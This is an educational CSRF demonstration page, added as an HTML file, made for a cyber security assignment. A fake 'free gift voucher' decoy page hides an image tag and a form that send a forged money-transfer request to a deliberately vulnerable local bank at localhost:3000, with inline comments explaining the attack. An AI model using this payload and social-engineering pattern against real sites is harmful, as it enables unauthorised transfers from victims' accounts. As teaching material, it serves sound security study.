@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<!--
+  ============================================================================
+   ATTACKER PAGE — EDUCATIONAL CSRF DEMONSTRATION ONLY
+  ============================================================================
+   Served from http://localhost:4001 (the ATTACKER origin).
+   The victim's bank runs on http://localhost:3000 (a DIFFERENT origin).
+
+   This page looks like a harmless "gift" page. In reality, when it loads,
+   a hidden <img> (and a backup auto-submitting form inside a hidden <iframe>)
+   fires a cross-origin GET request at the bank's vulnerable /transfer
+   endpoint. The victim's browser automatically attaches the bank session
+   cookie, so the vulnerable server performs the transfer as if the user
+   had clicked it themselves.
+
+   Key teaching points, marked inline below:
+     (1) The attacker never sees the bank's response (Same-Origin Policy
+         hides it) — but it does not need to. The damage is the side effect.
+     (2) No session cookie value is stolen or read. The browser sends it.
+     (3) A GET that changes state is all it takes.
+  ============================================================================
+-->
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>🎁 You Won a Free Gift!</title>
+    <style>
+      body {
+        font-family: system-ui, Arial, sans-serif;
+        background: linear-gradient(135deg, #ffe29f, #ffa99f);
+        margin: 0;
+        display: flex;
+        min-height: 100vh;
+        align-items: center;
+        justify-content: center;
+      }
+      .card {
+        background: #fff;
+        padding: 40px;
+        border-radius: 16px;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+        text-align: center;
+        max-width: 460px;
+      }
+      h1 { font-size: 2em; margin: 0 0 10px; }
+      p { color: #555; line-height: 1.5; }
+      .gift-btn {
+        margin-top: 20px;
+        background: #e63946;
+        color: #fff;
+        border: none;
+        padding: 16px 32px;
+        font-size: 1.2em;
+        border-radius: 10px;
+        cursor: pointer;
+      }
+      .gift-btn:hover { background: #c1121f; }
+      .edu {
+        margin-top: 28px;
+        padding: 14px;
+        background: #fff3cd;
+        border: 1px solid #ffe08a;
+        border-radius: 8px;
+        font-size: 0.85em;
+        color: #665200;
+        text-align: left;
+      }
+      code { background: #f1f1f1; padding: 1px 5px; border-radius: 4px; }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <h1>🎁 Congratulations!</h1>
+      <p>You have been selected to receive a <strong>FREE ₹1000 gift voucher</strong>.
+         Click the button below to claim it now!</p>
+
+      <!-- The button is pure social engineering / decoy. The attack actually
+           fires automatically on page load (see the <img> and <iframe> below),
+           but a button is included so the demo can also be triggered by a click. -->
+      <button class="gift-btn" onclick="fireAttack()">🎉 Claim Your Gift</button>
+
+      <div class="edu">
+        <strong>⚠️ Educational demo:</strong> This page is a harmless local
+        simulation for a Cyber Security assignment. On load it sends a
+        cross-origin <code>GET http://localhost:3000/transfer?amount=1000&amp;to=attacker</code>
+        request to the vulnerable bank. If you are logged into the bank in this
+        browser, the transfer will go through — that is the CSRF vulnerability.
+      </div>
+    </div>
+
+    <!--
+      (A) PRIMARY PAYLOAD: a hidden image.
+          The browser issues a GET for this "image" URL as soon as the page
+          loads. The URL is actually the bank's money-transfer endpoint.
+          The cookie is attached automatically; the (non-image) response is
+          discarded by the browser, which is fine for the attacker.
+    -->
+    <img
+      src="http://localhost:3000/transfer?amount=1000&to=attacker"
+      alt=""
+      width="1"
+      height="1"
+      style="display:none"
+      onerror="markFired('img')"
+      onload="markFired('img')"
+    />
+
+    <!--
+      (B) BACKUP PAYLOAD: a hidden iframe containing an auto-submitting form.
+          This shows the same attack works even for endpoints that ignore
+          image requests. The form targets the bank and submits on load.
+          (Here it is a GET form to match the vulnerable GET endpoint.)
+    -->
+    <iframe name="sink" style="display:none"></iframe>
+    <form
+      id="forged"
+      action="http://localhost:3000/transfer"
+      method="GET"
+      target="sink"
+    >
+      <input type="hidden" name="amount" value="1000" />
+      <input type="hidden" name="to" value="attacker" />
+    </form>
+
+    <script>
+      // Fire the backup form automatically on load as well.
+      function fireAttack() {
+        try {
+          document.getElementById('forged').submit();
+          markFired('form');
+        } catch (e) {
+          /* ignore — the <img> above already fired the primary payload */
+        }
+      }
+      function markFired(which) {
+        console.log('[attacker demo] payload fired via ' + which);
+      }
+      // NOTE: The hidden <img> above ALREADY fires one forged request
+      // (₹1000) automatically on page load — no click needed. That alone
+      // demonstrates the CSRF attack. The "Claim Your Gift" button fires the
+      // backup <form> payload for a second, click-driven demonstration.
+      // We deliberately do NOT auto-submit the form on load as well, so the
+      // demo drains a clean, predictable ₹1000 per visit.
+    </script>
+  </body>
+</html>
